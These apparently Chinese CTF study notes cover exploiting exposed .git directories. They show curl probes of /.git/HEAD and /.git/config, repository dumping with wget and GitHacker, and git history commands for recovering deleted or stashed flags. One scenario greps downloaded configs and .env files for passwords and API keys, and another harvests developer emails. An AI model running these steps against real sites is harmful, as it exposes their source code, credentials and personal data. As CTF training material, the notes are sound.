现在老版本默认的git分支名字为master，新版本则为main

1.例如有两个分支（master,secret）githacker可能只能还原masetr分支的信息



（可以用wget -r url/.git来下载整个网站，-r 为递归下载）,再使用git reflog查看所有记录，用git show id 来逐个查看

2.**如果访问.git返回403，可以尝试访问.git/config，如果有内容返回，则存在git泄露**

## 一、快速判断有无git泄露

（1）curl方法

```
curl http://target.com/.git/HEAD

输出：ref:  ref/heads/master    则存在
```

（2）url访问

```
直接访问   /.git/config  ,   有文件内容返回则存在或者他会直接下载一个文件
```

## 二、命令总结



```
（1）git log 查看历史提交记录，从远到近（看不到将来的）

（2）git reflog 查看所有提交记录（包括将来的）

注：在windows和linux下git reflog可能不太一样，之前做题windows用git reflog有几个版本看不了

（3）git stash list （开发者使用git stash临时保存未提交的修改，	flag可能被储藏后删除）
	可以用git stash pop来恢复

（4）git show <commit-hash> 显示git对象的详细信息（可以先用git reflog查看所有版本，再git show ID挨个查看）

（5）git branch -a 查看所有分支

（6）git diff 对比不同版本之间的差异，找到被删除的flag

# 对比两个提交
git diff <commit1> <commit2>

# 查看工作区与最新提交的差异
git diff HEAD

# 查看暂存区差异
git diff --cached

(7)git tag  查看标签
```











## CTF应用场景[¶](https://wilesangh.github.io/ctf-web/GitHacker使用手册/#ctf)

### 场景1: 标准 .git 泄露[¶](https://wilesangh.github.io/ctf-web/GitHacker使用手册/#1-git)

```
# 题目提示访问：http://challenge.com/

# 1. 检测 .git 目录
curl http://challenge.com/.git/config

# 2. 使用 GitHacker 下载
githacker -u http://challenge.com/.git/ -o source

# 3. 查看源码
cd source
ls -la

# 4. 查找 flag
grep -r "flag{" .
grep -r "FLAG{" .

# 5. 查看敏感文件
cat config.php
cat .env
```

### 场景2: 历史记录中的 Flag[¶](https://wilesangh.github.io/ctf-web/GitHacker使用手册/#2-flag)

```
# 下载源码
githacker -u http://challenge.com/.git/ -o source 

cd source

# 查看所有提交
git log --all --oneline

# 查找包含 "flag" 的提交
git log --all -S "flag" --source

# 查看特定提交
git show <commit_hash>

# 恢复删除的文件
git log --diff-filter=D --summary
git checkout <commit_hash> -- deleted_file.txt
```

### 场景3: 配置文件泄露[¶](https://wilesangh.github.io/ctf-web/GitHacker使用手册/#3_1)

```
# 下载源码
githacker -u http://challenge.com/.git/ -o source

cd source

# 查找配置文件
find . -name "config*"
find . -name ".env*"
find . -name "*.ini"
find . -name "*.yaml"

# 查看数据库配置
cat config/database.yml
cat .env

# 提取凭据
grep -r "password" config/
grep -r "api_key" .
```

### 场景4: 开发者信息收集[¶](https://wilesangh.github.io/ctf-web/GitHacker使用手册/#4_1)

```
cd source

# 查看开发者信息
git log --format="%an <%ae>" | sort -u

# 查看提交统计
git log --all --pretty=format:"%an" | sort | uniq -c | sort -nr

# 查看某个开发者的所有提交
git log --author="username" --all --oneline
```

### 场景5: Stash 和 Reflog[¶](https://wilesangh.github.io/ctf-web/GitHacker使用手册/#5-stash-reflog)

```
cd source

# 查看 stash
git stash list

# 查看 stash 内容
git stash show -p stash@{0}

# 应用 stash
git stash apply stash@{0}

# 查看 reflog（包括已删除的提交）
git reflog

# 恢复已删除的提交
git checkout <commit_hash>
```
